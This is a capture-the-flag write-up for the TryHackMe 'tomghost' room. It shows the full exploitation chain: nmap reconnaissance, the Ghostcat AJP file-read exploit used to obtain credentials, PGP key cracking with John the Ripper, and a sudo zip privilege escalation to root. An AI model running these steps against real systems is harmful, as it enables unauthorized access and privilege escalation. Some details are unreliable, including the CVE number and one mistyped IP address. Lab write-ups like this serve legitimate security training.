---
title: THM - tomghost
tags: [thm, CVE-2019-1938, ghostcat, ]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/016dea7c96e8b422241016405b571c8b.jpeg" alt="Challenge logo" style="height:150px;">
</div>

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

As usual, we start with a simple nmap scan

```
$ nmap -sC -sV 10.10.23.208

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (EdDSA)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:82:7E:1F:80:97 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Start with the web server accessible at the port 8080. Nothing more interesting rather than Apache Tomcat default page.

With a simple online search we can see a pretty known vulnerability for the same version: Ghostcat. This vulnerability, classified as `CVE-2019-1938`, is a file read/inclusion vulnerability in the AJP connector in Apache Tomcat. This is enabled by default with a default configuration port of 8009. A remote, unauthenticated attacker, could exploit this vulnerability to read web application files from a vulnerable server. In instances where the vulnerable web server allows file upload, an attacker could upload malicious JSP code within a variety of file types and trigger this vulnerability to gain remote code execution.

Let's use searchsploit to find some potential exploits.

```
$ searchsploit ghostcat

-------------------------------------------------------- -----------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- -----------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion       | multiple/webapps/48143.py
-------------------------------------------------------- -----------------------------
Shellcodes: No Results
```

Let's mirror it in our machine.

```
$ searchsploit -m multiple/webapps/48143.py
```

Run it to read `web.xml` file

```
$ python 48143.py -p 8009 -f WEB-INF/web.xml 10.10.23.208

...
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>
...
```

We gather some credentials. Try to log in through SSH

```
$ ssh skyfuck@10.10.23.208

skyfuck@ubuntu:~$
```

The `/home/merlin` directory is group readable. We can read the user flag inside his home directory

```
skyfuck@ubuntu:~$ cat /home/merlin/user.txt

THM{GhostCat_1s_so_[redacted]}
```

Inside skyfuck's home directory we can see two interesting files

```
skyfuck@ubuntu:~$ ls -l

total 12
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

`credential.pgp` is a file encrypted with a public key. `credential.asc` is the private key used to decrypt the messages. We can try to crack the private one with John The Ripper. Let's download them inside our machine

```
$ scp skyfuck@10.10.23.208:/home/skyfuck/credential.pgp
$ scp skyfuck@10.10.23.208:/home/skyfuck/tryhackme.asc
```

Let's crack them

```
$ gpg2john tryhackme.asc > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

alexandru        (tryhackme)
```

We have to import the private key and then decrypt the message.

```
$ gpg --import tryhackme.asc
$ gpg -d credential.pgp

gpg: WARNING: cypher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

We have a new pair of credentials. Let's use them to log into the machine as `merlin`.

```
$ ssh merlin@10.1.0.23.208

merlin@ubuntu:~$
```

Let's see which commands he can execute with sudo

```
merlin@ubuntu:~$ sudo -l

Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

`zip` is a privesc path. Go to GTFObins and use the following commands

```
merlin@ubuntu:~$ cd /tmp
merlin@ubuntu:/tmp$ TF=$(mktemp -u)
merlin@ubuntu:/tmp$ sudo zip $TF /etc/hosts -T -TT 'sh #'

# whoami
root
```

Let's get the flag

```
# cat /root/root.txt

THM{Z1P_1S_[redacted]}
```